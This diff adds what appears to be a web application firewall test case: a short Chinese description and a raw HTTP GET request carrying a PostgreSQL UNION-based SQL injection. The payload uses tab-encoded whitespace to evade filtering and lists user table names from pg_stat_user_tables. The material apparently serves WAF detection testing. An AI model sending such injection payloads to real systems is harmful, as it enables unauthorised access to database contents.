@@ -1,0 +1,9 @@
+# SQL注入_GET_postgresql _普通注入(空白符替换绕过)-06506368
+# 攻击者基于union查询使用空白符替换进行绕过，将"union%09select%09relname%09from%09pg_stat_user_tables%09limit%091%09offset%090"语句注入到 SQL 查询参数中，从系统表pg_stat_user_tables查询所有用户表的表名。
+GET /?id=1%2509and%25091=2%2509union%2509select%2509relname%2509from%2509pg_stat_user_tables%2509limit%25091%2509offset%25090&bid=hd_tag_m8mv23xq HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv23xq
+RM-PRO-Token: 1024c19dd0b8b6e905ace461ae742258
+RM-PRO-Time: 1742808351654
+User-Agent: curl/7.83.1
+
